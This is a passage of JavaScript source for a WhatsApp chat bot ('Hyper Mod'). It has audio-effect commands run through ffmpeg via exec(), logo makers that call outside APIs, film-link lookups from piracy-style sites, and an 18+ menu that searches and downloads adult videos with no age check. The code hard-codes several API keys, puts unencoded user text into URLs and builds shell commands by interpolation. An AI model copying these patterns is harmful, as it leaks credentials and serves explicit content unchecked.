                  hyper.sendMessage(from, hah, audio, { mimetype: 'audio/mp4', ptt: true, quoted: mek });
                  fs.unlinkSync(ran);
               });
               break;
               case prefix+ 'slow':
              if (!isQuotedAudio) return fakegroup('```Reply the audio!```')
              fakegroup(mess.wait)
               encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo;
               media = await hyper.downloadAndSaveMediaMessage(encmedia);
               ran = getRandom('.mp3');
               exec(`ffmpeg -i ${media} -filter_complex "[0:v]setpts=2*PTS[v];[0:a]atempo=0.5[a]" -map "[v]" -map "[a]" ${ran}`, (err, stderr, stdout) => {
                  fs.unlinkSync(media);
                  if (err) return reply('Error!');
                  hah = fs.readFileSync(ran);
                  hyper.sendMessage(from, hah, audio, { mimetype: 'audio/mp4', ptt: true, quoted: mek });
                  fs.unlinkSync(ran);
               });
               break;
               case prefix+'detikvn':
               if (!isQuotedAudio) return fakegroup('```Reply the audio!```')
              fakegroup(mess.wait)
encmediam = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					mediam = await hyper.downloadAndSaveMediaMessage(encmediam)
					cokmatane = Number(args[0])
					hah = fs.readFileSync(mediam)
						hyper.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', duration: cokmatane, ptt: true, quoted:mek})
						fs.unlinkSync(mediam)
				break
               case prefix+'robot':
               if (!isQuotedAudio) return fakegroup('```Reply the audio!```')
              fakegroup(mess.wait)
encmedial = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
medial = await hyper.downloadAndSaveMediaMessage(encmedial)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${medial} -filter_complex "afftfilt=real='hypot(re,im)*sin(0)':imag='hypot(re,im)*cos(0)':win_size=512:overlap=0.75" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(medial)
if (err) return reply(mess.error.api)
hah = fs.readFileSync(ran)
hyper.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', duration: 359996400, ptt:true, quoted: mek})
fs.unlinkSync(ran)
})
break
case prefix+'balik':
if (!isQuotedAudio) return fakegroup('```Reply the audio!```')
              fakegroup(mess.wait)
	encmediau = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	mediau = await hyper.downloadAndSaveMediaMessage(encmediau)
	ran = getRandom('.mp3')
	exec(`ffmpeg -i ${mediau} -filter_complex "areverse" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(mediau)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
hyper.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt: true, duration: 359996400, quoted:mek})
fs.unlinkSync(ran)
	})
break
               case prefix+'bass':                 
					if (!isQuotedAudio) return fakegroup('```Reply the audio!```')
              fakegroup(mess.wait)
					encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await hyper.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -af equalizer=f=94:width_type=o:width=2:g=30 ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
						hyper.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek})
						fs.unlinkSync(ran)
					})
				break
               case prefix+'slowmo':
				if (!isQuotedAudio) return fakegroup('```Reply the audio!```')
              fakegroup(mess.wait)
				encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
				media = await hyper.downloadAndSaveMediaMessage(encmedia);
				ran = getRandom('.mp3')
				exec(`ffmpeg -i ${media} -filter:a "atempo=0.7,asetrate=44100" ${ran}`, (err, stderr, stdout) => {
				fs.unlinkSync(media)
				if (err) return reply('Error!');
				uhh = fs.readFileSync(ran);
				hyper.sendMessage(from, uhh, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek});
				fs.unlinkSync(ran);
				});
				break;
               case prefix+'gemok':
				if (!isQuotedAudio) return fakegroup('```Reply the audio!```')
              fakegroup(mess.wait)
					encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await hyper.downloadAndSaveMediaMessage(encmedia);
					ran = getRandom('.mp3');
					exec(`ffmpeg -i ${media} -filter:a "atempo=1.6,asetrate=22100" ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media);
						if (err) return reply('Error!');
						hah = fs.readFileSync(ran);
						hyper.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek});
						fs.unlinkSync(ran);
					});
				break;
						case prefix+'welcome':
					if (!isGroup) return reply(ind.groupo())
					if (!isGroupAdmins && !isOwner && !mek.key.fromMe) return reply(ind.admin())
					if (args.length < 1) return reply('Activate press 1, Disable press 0')
					if (Number(args[0]) === 1) {
						if (isWelkom) return reply('*The welcome feature has been active before*')
						welkom.push(from)
						fs.writeFileSync('./database/bot/welkom.json', JSON.stringify(welkom))
						reply('❬ SUCCSESS ❭ activate the welcome feature in this group')
					} else if (Number(args[0]) === 0) {
						welkom.splice(from, 1)
						fs.writeFileSync('./database/bot/welkom.json', JSON.stringify(welkom))
						reply('❬ SUCCSESS ❭ disable the welcome feature in this group')
					} else {
						reply(ind.satukos())
					}
					break
case prefix+'makermenu':           

				try {
				             pporang = await hyper.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)
				} catch {
					          pporang = 'https://i.pinimg.com/originals/87/db/f5/87dbf52f353af29b2cbc3896b590c76c.jpg'
				}
				fcrew = await getBuffer(pporang)
				var menusaya = `╭─❒ MAKER MENU
├ ${prefix}wolf
├ ${prefix}tfire
├ ${prefix}neon
├ ${prefix}halloween
├ ${prefix}pornhub
├ ${prefix}pubg
├ ${prefix}marvel
├ ${prefix}avenger
├ ${prefix}captainamerica
├ ${prefix}hubcomment
├ ${prefix}flower
├ ${prefix}spiderman
├ ${prefix}vampire
├ ${prefix}wooden
├ ${prefix}harrypoter
├ ${prefix}galaxy
├ ${prefix}candy
├ ${prefix}royal
├ ${prefix}butterfly
├ ${prefix}coffee
├ ${prefix}love
├ ${prefix}shadow
├ ${prefix}lovemessage
├ ${prefix}lovelock
├ ${prefix}airline
├ ${prefix}airballoon
├ ${prefix}zombie3d
├ ${prefix}gaming
├ ${prefix}galaxywp
├ ${prefix}neonlight
├ ${prefix}qrcode
├ ${prefix}watercolor
├ ${prefix}devil
├ ${prefix}demon
├ ${prefix}magma
├ ${prefix}toxic
├ ${prefix}butterfly
└─────────────────❒`
await hyper.sendMessage(from,fcrew,image,{quoted: mek, caption : menusaya})       
break
case prefix+ '18menu':

       teks = `╭─❒ 18+ MENU
├ ${prefix}xhamstersearch
├ ${prefix}xnxxsearch
├ ${prefix}xnxx
├ ${prefix}xsearch
├ ${prefix}xvideo
└─────────────────❒`
                rakz = fs.readFileSync(`./image/Alexamenu.jpg`)
                buttons = [
          { buttonId: `${prefix}menu`, buttonText: { displayText: "MENU" }, type: 1 },
          { buttonId: `${prefix}sc`, buttonText: { displayText: "SCRIPT" }, type: 1 }
        ];         
        imageMsg = (
          await hyper.prepareMessageMedia(rakz, "imageMessage", {thumbnail: rakz,
           })).imageMessage;
        buttonsMessage = {
          contentText: `${teks}`,
          footerText: "Queen Alexa kkk",
          imageMessage: imageMsg,
          buttons: buttons,
          headerType: 4,
        };
        prep = await hyper.prepareMessageFromContent(
          from,
          { buttonsMessage }, {quoted: mek, contextInfo: {mentionedJid: [sender]}});

        hyper.relayWAMessage(prep);

break
        case prefix+'xhamstersearch': 
                    if (args.length == 0) return reply(`Example: ${prefix + command} Japanese`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/xhamstersearch?apikey=04c75aad4f01fc5f7166c03f&query=${query}`)
                    get_result = get_result.result
                    ini_txt = ""
                    for (var x of get_result) {
                        ini_txt += `Title : ${x.title}\n`
                        ini_txt += `Views : ${x.views}\n`
                        ini_txt += `Duration : ${x.duration}\n`
                        ini_txt += `Link : ${x.link}\n\n`
                    }
                    reply(ini_txt)
                    limitAdd(sender, limit)
                    break    
                    case prefix+'xnxxsearch':                
                    if (args.length == 0) return reply(`Example: ${prefix + command} Japanese`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/xnxxsearch?apikey=SiestaChan&query=${query}`)
                    get_result = get_result.result
                    ini_txt = ""
                    for (var x of get_result) {
                        ini_txt += `Title : ${x.title}\n`
                        ini_txt += `Views : ${x.views}\n`
                        ini_txt += `Duration : ${x.duration}\n`
                        ini_txt += `Uploader : ${x.uploader}\n`
                        ini_txt += `Link : ${x.link}\n`
                        ini_txt += `Thumbnail : ${x.thumbnail}\n\n`
                    }
                    reply(ini_txt)
                    break
                    case prefix+'xsearch':
                    case prefix+'xs':
                     
query = args.join(" ")
pepex = await fetchJson(`https://bx-hunter.herokuapp.com/api/xvideosearch?query=${query}&apikey=Ikyy69`)
reply(mess.wait)
pepex = pepex.result
ini_txt = ""
for (var x of pepex) {
ini_txt += `Title : ${x.title}\n`
ini_txt += `Info : ${x.info}\n`
ini_txt += `Link : ${x.link}\n\n\n`
}
anu = `${ini_txt}───────────────\n\n┌ ◪ *DOWNLOAD*
└ ${prefix}xvideo [link xvid] = Video`
hyper.sendMessage(from, anu, text, {quoted: mek})
break
case prefix+'xvideo':
case prefix+'xv':
query = args.join(" ")
x = await fetchJson(`https://bx-hunter.herokuapp.com/api/xvideodetail?url=${query}&apikey=Ikyy69`)
reply(mess.wait)
vid = await getBuffer(x.result.files.low)
hyper.sendMessage(from, vid, video, {quoted: mek})
break
                    case prefix+'xnxx': 
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://www.xnxx.com/video-uy5a73b/mom_is_horny_-_brooklyn`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/xnxx?apikey=7ed90d537ab5edddb6ba6465&url=${query}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Duration : ${get_result.duration}\n`
                    ini_txt += `View : ${get_result.view}\n`
                    ini_txt += `Rating : ${get_result.rating}\n`
                    ini_txt += `Like : ${get_result.like}\n`
                    ini_txt += `Dislike : ${get_result.dislike}\n`
                    ini_txt += `Comment : ${get_result.comment}\n`
                    ini_txt += `Tag : ${get_result.tag.join(", ")}\n`
                    ini_txt += `Description : ${get_result.description}\n`
                    ini_txt += "Link : \n"
                    ini_link = get_result.link
                    for (var x of ini_link) {
                        ini_txt += `${x.type} - ${x.link}\n\n`
                    }
                    thumbnail = await getBuffer(get_result.thumbnail)
                    await hyper.sendMessage(from, thumbnail, image, { quoted: ftroli, caption: ini_txt })
                    break 
                    case prefix+'searchfilm':
               
                pshh = `${body.slice(12)}`
                  anu = await fetchJson(`https://api.zeks.xyz/api/film/2?q=${pshh}&apikey=apivinz`, {method: 'get'})
                  puree = '======================\n'
                  for (let plyll of anu.result){
                  puree += ` *Judul:* ${plyll.title}\n *Link:* ${plyll.url}\n=====================\n`
                  }
                  reply(puree.trim())
                  break
                  case prefix+'film': 	
					hyper.updatePresence(from, Presence.composing) 
					data = await fetchJson(`https://api.zeks.xyz/api/film/2?q=${body.slice(6)}&apikey=apivinz`, {method: 'get'})
					teks = '=================\n'
					for (let i of data.result) {
						teks += `*Title:* : ${i.title}\n*Url* : ${i.url}\n=================\n`
					}
					reply(teks.trim())
					break
				case prefix+'film2': 	
					hyper.updatePresence(from, Presence.composing) 
					data = await fetchJson(`https://api.zeks.xyz/api/film/2?q=${body.slice(6)}&apikey=apivinz`, {method: 'get'})
					teks = '=================\n'
					for (let i of data.result) {
						teks += `*Title:* : ${i.title}\n*Url* : ${i.url}\n=================\n`
					}
					reply(teks.trim())
					break
					case prefix+'filmapikterbaru':
				film = await fetchJson(`http://zekais-api.herokuapp.com/filmapiklatest`, {method: 'get'})
				teks = '=================\n'
				for (let i of film.result) {
					teks += `*Nama film* : ${i.name}\n*Quality* : ${i.quality}\n*Rating* : ${i.star}\n*Link* : ${i.url}\n=================\n`
					}
				reply(teks.trim())
				break
				case prefix+'filmapikdrama':
				film = await fetchJson(`http://zekais-api.herokuapp.com/filmapiklatest`, {method: 'get'})
				teks = '=================\n'
				for (let i of film.result) {
					teks += `*Nama film* : ${i.name}\n*Quality* : ${i.quality}\n*Rating* : ${i.star}\n*Link* : ${i.url}\n=================\n`
					}
				reply(teks.trim())
				break
				case prefix+'lk21':
                    query = args.join(" ")
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/lk21?apikey=b170074ac846042f35937286&query=${query}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Link : ${get_result.link}\n`
                    ini_txt += `Genre : ${get_result.genre}\n`
                    ini_txt += `Views : ${get_result.views}\n`
                    ini_txt += `Duration : ${get_result.duration}\n`
                    ini_txt += `Tahun : ${get_result.tahun}\n`
                    ini_txt += `Rating : ${get_result.rating}\n`
                    ini_txt += `Desc : ${get_result.desc}\n`
                    ini_txt += `Actors : ${get_result.actors.join(", ")}\n`
                    ini_txt += `Location : ${get_result.location}\n`
                    ini_txt += `Date Release : ${get_result.date_release}\n`
                    ini_txt += `Language : ${get_result.language}\n`
                    ini_txt += `Link Download : ${get_result.link_dl}`
                    thumbnail = await getBuffer(get_result.thumbnail)
                    hyper.sendMessage(from, thumbnail, image, { quoted: mek, caption: ini_txt })
                    break
                    case prefix+'drakorongoing':                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/drakorongoing?apikey=b170074ac846042f35937286`)
                    get_result = get_result.result
                    ini_txt = "Ongoing Drakor\n\n"
                    for (var x of get_result) {
                        ini_txt += `Title : ${x.title}\n`
                        ini_txt += `Link : ${x.link}\n`
                        ini_txt += `Thumbnail : ${x.thumbnail}\n`
                        ini_txt += `Year : ${x.category}\n`
                        ini_txt += `Total Episode : ${x.total_episode}\n`
                        ini_txt += `Genre : ${x.genre.join(", ")}\n\n`
                    }
                    reply(ini_txt)
                    break
                    case prefix+'wattpad':                    if (args.length == 0) return reply(`Example: ${prefix + command} https://www.wattpad.com/707367860-kumpulan-quote-tere-liye-tere-liye-quote-quote`)
                    ini_url = args[0]
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/wattpad?apikey=b170074ac846042f35937286&url=${ini_url}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Rating : ${get_result.rating}\n`
                    ini_txt += `Motify date : ${get_result.modifyDate}\n`
                    ini_txt += `Create date: ${get_result.createDate}\n`
                    ini_txt += `Word : ${get_result.word}\n`
                    ini_txt += `Comment : ${get_result.comment}\n`
                    ini_txt += `Vote : ${get_result.vote}\n`
                    ini_txt += `Reader : ${get_result.reader}\n`
                    ini_txt += `Pages : ${get_result.pages}\n`
                    ini_txt += `Description : ${get_result.desc}\n\n`
                    ini_txt += `Story : \n${get_result.story}`
                    thumbnail = await getBuffer(get_result.photo)
                    hyper.sendMessage(from, thumbnail, image, { quoted: mek, caption: ini_txt })
                    break
                case prefix+'wattpadsearch':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Avenger`)
                    query = args.join(" ")
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/wattpadsearch?apikey=b170074ac846042f35937286&query=${query}`)
                    get_result = get_result.result
                    ini_txt = "Wattpad Seach : \n"
                    for (var x of get_result) {
                        ini_txt += `Title : ${x.title}\n`
                        ini_txt += `Url : ${x.url}\n`
                        ini_txt += `Part : ${x.parts}\n`
                        ini_txt += `Motify date : ${x.modifyDate}\n`
                        ini_txt += `Create date: ${x.createDate}\n`
                        ini_txt += `Coment count: ${x.commentCount}\n\n`
                    }
                    reply(ini_txt)
                    break
				case prefix+'galaxy':  
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} HYPER MOD*`)
                   query = args.join(" ")
                   reply(`Wait sending your logo👻`)
                   anu = await getBuffer(`http://zekais-api.herokuapp.com/textpro/galaxy?text=${query}&apikey=HzP5FNLv`)
                   hyper.sendMessage(from, anu, image, {caption: `Made By Hyper Mod `, quoted: mek})
                   break 
                   case prefix+'candy':  
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} HYPER MOD*`)
                   query = args.join(" ")
                   reply(`Wait sending your logo👻`)
                   anu = await getBuffer(`http://zekais-api.herokuapp.com/oxy/candy?text=${query}&apikey=HzP5FNLv`)
                   hyper.sendMessage(from, anu, image, {caption: `Made By Hyper Mod `, quoted: mek})
                   break 
                   case prefix+'royal':  
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} HYPER MOD*`)
                   query = args.join(" ")
                   reply(`Wait sending your logo👻`)
                   anu = await getBuffer(`http://zekais-api.herokuapp.com/oxy/royal?text=${query}&apikey=HzP5FNLv`)
                   hyper.sendMessage(from, anu, image, {caption: `Made By Hyper Mod `, quoted: mek})
                   break 
                   case prefix+'butterfly':  
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} HYPER MOD*`)
                   query = args.join(" ")
                   reply(`Wait sending your logo👻`)
                   anu = await getBuffer(`http://zekais-api.herokuapp.com/oxy/butterfly?text=${query}&apikey=HzP5FNLv`)
                   hyper.sendMessage(from, anu, image, {caption: `Made By Hyper Mod `, quoted: mek})
                   break 
                   case prefix+'coffee':  
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} HYPER MOD*`)
                   query = args.join(" ")
                   reply(`Wait sending your logo👻`)
                   anu = await getBuffer(`http://zekais-api.herokuapp.com/oxy/coffee?text=${query}&apikey=HzP5FNLv`)
                   hyper.sendMessage(from, anu, image, {caption: `Made By Hyper Mod `, quoted: mek})
                   break 
                   case prefix+'love':  
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} HYPER MOD*`)
                   query = args.join(" ")
                   reply(`Wait sending your logo👻`)
                   anu = await getBuffer(`http://zekais-api.herokuapp.com/oxy/love?text=${query}&apikey=HzP5FNLv`)
                   hyper.sendMessage(from, anu, image, {caption: `Made By Hyper Mod `, quoted: mek})
                   break 
                   case prefix+'shadow':  
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} HYPER MOD*`)
                   query = args.join(" ")
                   reply(`Wait sending your logo👻`)
                   anu = await getBuffer(`http://zekais-api.herokuapp.com/oxy/shadow?text=${query}&apikey=HzP5FNLv`)
                   hyper.sendMessage(from, anu, image, {caption: `Made By Hyper Mod `, quoted: mek})
                   break 
                   case prefix+'lovemessage':  
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} HYPER MOD*`)
                   query = args.join(" ")
                   reply(`Wait sending your logo👻`)
                   anu = await getBuffer(`https://api.lolhuman.xyz/api/photooxy1/lovemessage?apikey=04c75aad4f01fc5f7166c03f&text=${query}`)
                   hyper.sendMessage(from, anu, image, {caption: `Made By Hyper Mod `, quoted: mek})
                   await limitAdd(sender) 
                   break   
                   case prefix+'lovelock':  
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} HYPER MOD*`)
                   query = args.join(" ")
                   reply(`Wait sending your logo👻`)
                   anu = await getBuffer(`https://dapuhy-api.herokuapp.com/api/photofunia/lovelock?text=${query}&apikey=hypermod`)
                   hyper.sendMessage(from, anu, image, {caption: `Made By Hyper Mod `, quoted: mek})
                   break           
                   case prefix+'airline':  
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} HYPER MOD*`)
                   query = args.join(" ")
                   reply(`Wait sending your logo👻`)
                   anu = await getBuffer(`https://dapuhy-api.herokuapp.com/api/photofunia/airline?text1=hyperofc&text2=${query}&apikey=hypermod`)
                   hyper.sendMessage(from, anu, image, {caption: `Made By Hyper Mod `, quoted: mek})
                   break           
                   case prefix+'airballoon':  
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} HYPER MOD*`)
                   query = args.join(" ")
                   reply(`Wait sending your logo👻`)
                   anu = await getBuffer(`https://dapuhy-api.herokuapp.com/api/photofunia/airballoon?text=${query}&apikey=hypermod`)
                   hyper.sendMessage(from, anu, image, {caption: `Made By Hyper Mod `, quoted: mek})
                   break      
                   case prefix+'zombie3d':  
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} HYPER MOD*`)
                   query = args.join(" ")
                   reply(`Wait sending your logo👻`)
                   anu = await getBuffer(`https://dapuhy-api.herokuapp.com/api/ephoto/zombie3d?text=${query}&apikey=hypermod`)
                   hyper.sendMessage(from, anu, image, {caption: `Made By Hyper Mod `, quoted: mek})
                   break      
                   case prefix+'captainamerica':  
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} CAPTAIN HYPER*`)
                   query = args.join(" ")
                   reply(`Wait sending your logo👻`)
                   anu = await getBuffer(`https://dapuhy-api.herokuapp.com/api/ephoto/captainamerica?text1=MARVEL&text2=${query}&apikey=hypermod`)
                   hyper.sendMessage(from, anu, image, {caption: `Made By Hyper Mod `, quoted: mek})
                   break
                   case prefix+'marvel':  
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} STUDIO*`)
                   query = args.join(" ")
                   reply(`Wait sending your logo👻`)
                   anu = await getBuffer(`https://dapuhy-api.herokuapp.com/api/textpro/marvelstudio2?text1=MARVEL&text2=${query}&apikey=hypermod`)
                   hyper.sendMessage(from, anu, image, {caption: `Made By Hyper Mod `, quoted: mek})
                   break
                   case prefix+'gaming':  
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} HYPER MOD*`)
                   query = args.join(" ")
                   reply(`Wait sending your logo👻`)
                   anu = await getBuffer(`http://docs-jojo.herokuapp.com/api/gaming?text=${query}`)
                   hyper.sendMessage(from, anu, image, {caption: `Made By Hyper Mod `, quoted: mek})
                   break
                   case prefix+'galaxywp':  
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} HYPER MOD*`)
                   query = args.join(" ")
                   reply(`Wait sending your logo👻`)
                   anu = await getBuffer(`http://docs-jojo.herokuapp.com/api/galaxywp?text=${query}`)
                   hyper.sendMessage(from, anu, image, {caption: `Made By Hyper Mod `, quoted: mek})
                   break
                   case prefix+'neonlight':  
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} HYPER MOD*`)
                   query = args.join(" ")
                   reply(`Wait sending your logo👻`)
                   anu = await getBuffer(`http://docs-jojo.herokuapp.com/api/neon_light?text=${query}`)
                   hyper.sendMessage(from, anu, image, {caption: `Made By Hyper Mod `, quoted: mek})
                   break
                   case prefix+'qrcode':  
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} HYPER MOD*`)
                   query = args.join(" ")
                   reply(`Wait sending your logo👻`)
                   anu = await getBuffer(`http://docs-jojo.herokuapp.com/api/qrcode?text=${query}`)
                   hyper.sendMessage(from, anu, image, {caption: `Made By Hyper Mod `, quoted: mek})
                   break
                      case prefix+'watercolor':  
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} HYPER MOD*`)
                   query = args.join(" ")
                   reply(`Wait sending your logo👻`)
                   anu = await getBuffer(`http://docs-jojo.herokuapp.com/api/watercolor?text=${query}`)
                   hyper.sendMessage(from, anu, image, {caption: `Made By Hyper Mod `, quoted: mek})
                   break
                    case prefix+'devil':  
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} HYPER MOD*`)
                   query = args.join(" ")
                   reply(`Wait sending your logo👻`)
                   anu = await getBuffer(`https://zekais-api.herokuapp.com/textpro/devil?text=${query}&apikey=4Rwg8aFC`)
                   hyper.sendMessage(from, anu, image, {caption: `Made By Hyper Mod `, quoted: mek})
                   break
                   case prefix+'demon':  
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} HYPER MOD*`)
                   query = args.join(" ")
                   reply(`Wait sending your logo👻`)
                   anu = await getBuffer(`https://zekais-api.herokuapp.com/textpro/demon?text=${query}&apikey=4Rwg8aFC`)
                   hyper.sendMessage(from, anu, image, {caption: `Made By Hyper Mod `, quoted: mek})
                   break
                   case prefix+'magma':  
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} HYPER MOD*`)
                   query = args.join(" ")
                   reply(`Wait sending your logo👻`)
                   anu = await getBuffer(`https://zekais-api.herokuapp.com/textpro/magma?text=${query}&apikey=4Rwg8aFC`)
                   hyper.sendMessage(from, anu, image, {caption: `Made By Hyper Mod `, quoted: mek})
                   break
                   case prefix+'toxic':  
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} HYPER MOD*`)
                   query = args.join(" ")
                   reply(`Wait sending your logo👻`)
                   anu = await getBuffer(`https://zekais-api.herokuapp.com/textpro/toxic?text=${query}&apikey=4Rwg8aFC`)
                   hyper.sendMessage(from, anu, image, {caption: `Made By Hyper Mod `, quoted: mek})
                   break
                   case prefix+'butterfly':  
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} HYPER MOD*`)
                   query = args.join(" ")
                   reply(`Wait sending your logo👻`)
                   anu = await getBuffer(`https://zekais-api.herokuapp.com/oxy/butterfly?text=${query}&apikey=4Rwg8aFC`)
                   hyper.sendMessage(from, anu, image, {caption: `Made By Hyper Mod `, quoted: mek})
                   break                   
                    case prefix+'wolf':  
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} HYPER MOD*`)
                   F = body.slice(6)     
                   reply(`Wait sending your logo👻`)
                   anu = await getBuffer(`https://api.zeks.xyz/api/wolflogo?apikey=Alphabott&text1=hyperofc&text2=${F}`)
                   hyper.sendMessage(from, anu, image, {caption: `Made By Hyper Mod `, quoted: mek})
                   break 
                   case prefix+'tfire':  
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} HYPER MOD*`)
                   F = body.slice(6)
                   reply(`Wait sending your logo👻`)
                   anu = await getBuffer(`https://api.zeks.me/api/tfire?apikey=7hlxnlcTIjkaYRnCabIkkCDaBMX&text=${F}`)
                   hyper.sendMessage(from, anu, image, {caption: `Made By Hyper Mod `, quoted: mek})
                   break
                   case prefix+'neon':  
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} HYPER MOD*`)
                   F = body.slice(6)
                   reply(`Wait sending your logo👻`)
                   anu = await getBuffer(`https://api.zeks.me/api/bneon?apikey=7hlxnlcTIjkaYRnCabIkkCDaBMX&text=${F}`)
                   hyper.sendMessage(from, anu, image, {caption: `Made By Hyper Mod `, quoted: mek})
                   break    
                   case prefix+'harrypoter':  
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} HYPER MOD*`)
                   query = args.join(" ")
                   reply(`Wait sending your logo👻`)
                   anu = await getBuffer(`https://bx-hunter.herokuapp.com/api/flamingtext/harry?text=${query}&apikey=Ikyy69`)
                   hyper.sendMessage(from, anu, image, {caption: `Made By Hyper Mod `, quoted: mek})
                   break              
                   case prefix+'halloween':  
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} HYPER MOD*`)
                   query = args.join(" ")
                   reply(`Wait sending your logo👻`)
                   anu = await getBuffer(`https://bx-hunter.herokuapp.com/api/flamingtext/halloween?text=${query}&apikey=Ikyy69`)
                   hyper.sendMessage(from, anu, image, {caption: `Made By Hyper Mod `, quoted: mek})
                   break  
                   case prefix+'wooden':  
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} HYPER MOD*`)
                   query = args.join(" ")
                   reply(`Wait sending your logo👻`)
                   anu = await getBuffer(`https://api-xchillds.herokuapp.com/api/textmaker/roses?text=${query}&theme=wooden-boarch&apikey=XChillDs`)
                   hyper.sendMessage(from, anu, image, {caption: `Made By Hyper Mod `, quoted: mek})
                   break
                   case prefix+'vampire':  
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} HYPER MOD*`)
                   query = args.join(" ")
                   reply(`Wait sending your logo👻`)
                   anu = await getBuffer(`https://bx-hunter.herokuapp.com/api/flamingtext/vampire?text=${query}&apikey=Ikyy69`)
                   hyper.sendMessage(from, anu, image, {caption: `Made By Hyper Mod `, quoted: mek})
                   break     
                   case prefix+'pornhub':  
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} hypermod&mod*`)
                   var F = body.slice(9)
				   var F1 = F.split("&")[0];
				   var F2 = F.split("&")[1]; 
                   reply(`Wait sending your logo👻`)
                   anu = await getBuffer(`https://api.zeks.xyz/api/phlogo?text1=${F1}&text2=${F2}&apikey=Alphabott`)
                   hyper.sendMessage(from, anu, image, {caption: `Made By Hyper Mod `, quoted: mek})
                   break
                   case prefix+'pubg':  
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} hypermod&mod*`)
                   var F = body.slice(9)
				   var F1 = F.split("&")[0];
				   var F2 = F.split("&")[1]; 
                   reply(`Wait sending your logo👻`)
                   anu = await getBuffer(`https://api.zeks.me/api/pubglogo?apikey=7hlxnlcTIjkaYRnCabIkkCDaBMX&text1=${F1}&text2=${F2}`)
                   hyper.sendMessage(from, anu, image, {caption: `Made By Hyper Mod `, quoted: mek})
                   break
                   case prefix+'avenger':  
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} hypermod&mod*`)
                   var F = body.slice(9)
				   var F1 = F.split("&")[0];
				   var F2 = F.split("&")[1]; 
                   reply(`Wait sending your logo👻`)
                   anu = await getBuffer(`https://api.zeks.me/api/logoaveng?apikey=7hlxnlcTIjkaYRnCabIkkCDaBMX&text1=${F1}&text2=${F2}`)
                   hyper.sendMessage(from, anu, image, {caption: `Made By Hyper Mod `, quoted: mek})
                   break
